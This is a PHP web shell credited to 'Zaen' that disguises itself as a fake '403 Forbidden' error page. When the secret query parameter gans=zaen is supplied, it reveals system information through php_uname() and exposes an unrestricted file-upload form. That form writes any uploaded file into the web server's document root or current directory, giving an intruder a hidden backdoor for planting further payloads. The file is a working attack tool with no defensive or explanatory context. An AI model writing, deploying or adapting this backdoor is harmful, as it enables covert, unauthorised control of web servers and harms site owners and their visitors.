<?php
/*############################################*/
/*#        Hidden Mode 403 Forbidden         # */
/*#        Author : Zaen                     #*/
/*#          Team :  Purworejo 6etar         #*/
/*#       Contact : zaenjr5@gmail.com        #*/
/*############################################ */ 
//ex= http://localhost:8080/zaen.php?gans=zaen
$purworejo= 'zaen';	    
$zaen = $_SERVER['REQUEST_URI'];
echo "<html><head><title>403 Forbidden</title></head>";
echo "<body><h1>Forbidden</h1>";
echo "<p>You don't have permission to acces ".$zaen." on this server.<p>";
echo "<p>Additionally, a 403 Forbidden error was accountered while trying to use an ErrorDocument to handle the request.</p>";
echo "</body></html>";
if($_GET['gans']==$purworejo){
	echo "Hidden mode 403";
	echo "<br>";
	//server info
echo "<b><font color='lime'>".php_uname()."</font></b><br>";
//dok root
echo "<form method='post' enctype='multipart/form-data'>
      <center><input type='file' name='idx_file'>
      <input type='submit' name='upload' value='upload'></center>
      </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
    if(is_writable($root)) {
        if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
            $web = "http://".$_SERVER['HTTP_HOST']."/";
            echo "sukses upload -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
        } else {
            echo "gagal upload di document root.";
        }
    } else {
        if(@copy($_FILES['idx_file']['tmp_name'], $files))   {
        	
            echo "sukses upload <b>$files</b> di folder ini";
        } else {
            echo "gagal";  
            
            }
}
}
}

?>